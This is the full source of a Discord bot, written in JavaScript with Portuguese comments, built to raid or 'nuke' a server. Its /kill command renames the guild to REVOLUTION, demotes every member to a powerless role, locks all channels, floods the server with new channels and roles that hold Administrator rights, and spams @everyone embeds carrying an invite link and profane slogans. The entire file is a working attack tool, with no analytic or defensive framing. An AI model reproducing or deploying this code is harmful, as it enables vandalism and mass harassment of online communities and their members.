const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require('discord.js');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ============ CLIENT ============
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.commands = new Map();

// ============ MENSAGEM PERSONALIZADA ============
const mensagemSpam = `⚠️ **Aviso**

O servidor está passando por um ataque neste momento. A equipe de moderação já foi informada e está trabalhando para normalizar a situação.

Pedimos que todos os membros mantenham a calma, evitem clicar em links suspeitos e denunciem qualquer comportamento malicioso aos administradores.

Obrigado pela compreensão.

https://discord.gg/Cg4DXEMbn
https://klipy.com/gifs/linux-tux-3
https://klipy.com/gifs/greetings-f-society
https://klipy.com/gifs/trava-zap

# hackds by ordemX
# manda o governo se fuder aq e nois porra
# morre panela
https://klipy.com/gifs/wearelegend

@everyone`;

// ============ GERENCIADOR DE ATAQUE ============
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
  }

  startAttack(guild, user, client) {
    const guildId = guild.id;
    
    if (this.activeAttacks.has(guildId)) {
      this.stopAttack(guildId);
    }

    let isRunning = true;

    // ============ 1. MUDA O NOME DO SERVIDOR ============
    const changeServerName = async () => {
      try {
        await guild.setName('REVOLUTION');
        console.log(`📛 NOME DO SERVIDOR ALTERADO PARA: REVOLUTION`);
      } catch (error) {}
    };
    changeServerName();

    // ============ 2. CRIA CARGO INFERIOR PARA TODOS ============
    const createLowRole = async () => {
      try {
        const lowRoleName = 'REVOLUTION_SUB';
        let lowRole = guild.roles.cache.find(r => r.name === lowRoleName);
        if (!lowRole) {
          lowRole = await guild.roles.create({
            name: lowRoleName,
            color: '#333333',
            position: 0,
            permissions: []
          });
        }

        const members = guild.members.cache.filter(m => 
          !m.user.bot && m.id !== user.id && m.id !== client.user.id
        );

        for (const member of members.values()) {
          try {
            await member.roles.set([lowRole.id]);
          } catch (error) {}
        }
      } catch (error) {}
    };
    createLowRole();
    const rebaixamentoInterval = setInterval(createLowRole, 30000);

    // ============ 3. LOCK EM TODOS OS CANAIS ============
    const lockAllChannels = async () => {
      try {
        const channels = guild.channels.cache.filter(ch => ch.isTextBased());
        for (const channel of channels.values()) {
          try {
            await channel.permissionOverwrites.edit(guild.id, {
              SendMessages: false,
              AddReactions: false
            });
            await channel.permissionOverwrites.edit(client.user.id, {
              SendMessages: true,
              AddReactions: true
            });
            const owner = guild.members.cache.get(user.id);
            if (owner) {
              await channel.permissionOverwrites.edit(owner.id, {
                SendMessages: true,
                AddReactions: true,
                ManageMessages: true
              });
            }
          } catch (error) {}
        }
      } catch (error) {}
    };
    lockAllChannels();
    const lockInterval = setInterval(lockAllChannels, 15000);

    // ============ 4. CRIAÇÃO DE CANAIS ============
    let channelCounter = 0;
    const createChannel = async () => {
      if (!isRunning) return;
      try {
        channelCounter++;
        const channelName = `raid-by-revolution-${channelCounter}`;
        const existing = guild.channels.cache.find(c => c.name === channelName);
        if (!existing) {
          await guild.channels.create({
            name: channelName,
            type: 0,
            permissionOverwrites: [
              {
                id: guild.id,
                allow: ['ViewChannel']
              }
            ]
          });
          console.log(`📁 CANAL CRIADO: #${channelName}`);
        }
      } catch (error) {}
    };

    for (let i = 0; i < 10; i++) createChannel();
    const channelInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) createChannel();
    }, 200);

    // ============ 5. CRIAÇÃO DE CARGOS ============
    const createRole = async () => {
      if (!isRunning) return;
      try {
        await guild.roles.create({
          name: 'RAID BY REVOLUTION',
          color: '#ff0000',
          permissions: [PermissionsBitField.Flags.Administrator]
        });
      } catch (error) {}
    };

    for (let i = 0; i < 10; i++) createRole();
    const roleInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) createRole();
    }, 200);

    // ============ 6. SPAM COM A MENSAGEM PERSONALIZADA ============
    let messageCount = 0;

    const spamFunction = async () => {
      if (!isRunning) return;
      
      try {
        const channels = guild.channels.cache.filter(ch => 
          ch.isTextBased() && 
          ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
        );
        
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;

        for (const channel of channelArray.slice(0, 10)) {
          if (!isRunning) break;
          try {
            const embed = new EmbedBuilder()
              .setTitle('🔥 REVOLUTION 🔥')
              .setDescription(mensagemSpam)
              .setColor('#ff0000')
              .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
              .setFooter({ text: 'REVOLUTION - SAIAM DAS TREVAS' })
              .setTimestamp();

            await channel.send({ 
              content: `@everyone 🔥 SERVIDOR TOMADO POR REVOLUTION 🔥`,
              embeds: [embed]
            });
            messageCount++;
          } catch (error) {}
        }
        
        if (messageCount % 10 === 0) {
          console.log(`📢 SPAM #${messageCount} enviado`);
        }
      } catch (error) {}
    };

    const spamInterval = setInterval(spamFunction, 100);
    for (let i = 0; i < 5; i++) {
      setTimeout(spamFunction, i * 10);
    }

    // ============ SALVA O ATAQUE ============
    this.activeAttacks.set(guildId, {
      spamInterval,
      channelInterval,
      roleInterval,
      lockInterval,
      rebaixamentoInterval,
      isRunning,
      target: guild.name,
      author: user.tag,
      startTime: new Date(),
      messageCount: 0,
      stop: () => {
        isRunning = false;
        clearInterval(spamInterval);
        clearInterval(channelInterval);
        clearInterval(roleInterval);
        clearInterval(lockInterval);
        clearInterval(rebaixamentoInterval);
        this.activeAttacks.delete(guildId);
        console.log(`🛑 ATAQUE PARADO no servidor ${guild.name}`);
      }
    });

    console.log(`🔥 ATAQUE REVOLUTION iniciado no servidor ${guild.name} por ${user.tag}`);
    return this.activeAttacks.get(guildId);
  }

  stopAttack(guildId) {
    const attack = this.activeAttacks.get(guildId);
    if (attack) {
      attack.stop();
      return true;
    }
    return false;
  }

  getStatus(guildId) {
    return this.activeAttacks.get(guildId) || null;
  }
}

const attackManager = new AttackManager();

// ============ COMANDO: KILL ============
client.commands.set('kill', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({
        content: '❌ VOCE PRECISA SER ADMINISTRADOR NO SERVIDOR.',
        ephemeral: true
      });
    }

    try {
      await attackManager.startAttack(interaction.guild, interaction.user, client);

      const successEmbed = new EmbedBuilder()
        .setTitle('🔥 ATAQUE REVOLUTION INICIADO')
        .setColor('#ff0000')
        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE`)
        .addFields(
          { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
          { name: 'PARAR', value: 'USE /end PARA PARAR', inline: true },
          { name: 'STATUS', value: 'ATAQUE EM ANDAMENTO', inline: false }
        )
        .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
        .setFooter({ text: 'REVOLUTION - ATAQUE' })
        .setTimestamp();

      await interaction.reply({ embeds: [successEmbed] });
      console.log(`🔥 ATAQUE iniciado por ${interaction.user.tag} no servidor ${interaction.guild.name}`);

    } catch (error) {
      await interaction.reply({ 
        content: `❌ ERRO: ${error.message}`,
        ephemeral: true
      });
      console.error(`ERRO NO KILL: ${error.message}`);
    }
  }
});

// ============ COMANDO: END ============
client.commands.set('end', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    const guildId = interaction.guild.id;
    const attack = attackManager.getStatus(guildId);
    
    if (attack) {
      attackManager.stopAttack(guildId);
      
      const embed = new EmbedBuilder()
        .setTitle('🛑 ATAQUE PARADO')
        .setColor('#00ff00')
        .setDescription('O ATAQUE REVOLUTION FOI DESATIVADO')
        .addFields(
          { name: 'PARADO POR', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE PARADO', inline: true }
        )
        .setFooter({ text: 'REVOLUTION - DESATIVADO' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      console.log(`🛑 END executado por ${interaction.user.tag}`);
    } else {
      await interaction.reply({
        content: '❌ NENHUM ATAQUE ATIVO PARA PARAR.',
        ephemeral: true
      });
    }
  }
});

// ============ EVENTOS ============

client.on('ready', () => {
  console.log(`🚀 Bot ${client.user.tag} esta ONLINE!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);
  
  client.user.setPresence({
    activities: [{
      name: 'REVOLUTION | /kill',
      type: 3,
      state: 'Use /kill para ATACAR'
    }],
    status: 'online'
  });
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) {
    return interaction.reply({
      content: '❌ COMANDO NAO ENCONTRADO!',
      ephemeral: true
    });
  }

  try {
    await command.execute(interaction);
  } catch (error) {
    console.error(`Erro no comando ${interaction.commandName}: ${error.message}`);
    
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    } else {
      await interaction.reply({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    }
  }
});

// ============ SERVIDOR WEB ============
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot Revolution esta ONLINE!');
});

app.get('/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    ataquesAtivos: attackManager.activeAttacks.size,
    servidores: client.guilds.cache.size
  });
});

app.listen(PORT, () => {
  console.log(`Servidor web rodando na porta ${PORT}`);
});

// ============ LOGIN ============

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error('TOKEN NAO ENCONTRADO!');
  process.exit(1);
}

client.login(TOKEN).catch(error => {
  console.error(`Erro ao fazer login: ${error.message}`);
  process.exit(1);
});
